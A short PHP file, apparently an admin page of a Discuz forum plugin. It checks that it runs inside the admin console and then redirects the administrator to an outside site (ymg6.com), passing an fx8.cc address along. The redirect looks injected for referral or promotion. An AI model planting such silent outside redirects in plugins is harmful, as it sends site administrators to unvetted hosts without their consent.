<?php

if(!defined('IN_DISCUZ') || !defined('IN_ADMINCP')) {
	exit('Access Denied');
}
$TOMCLOUDHOST = "http://www.fx8.cc";
$urlBaseUrl = "http://www.fx8.cc/?Jt2oC5 "; 
dheader('location:http://www.ymg6.com/?RZEa8t9'.  urlencode($urlBaseUrl));
?>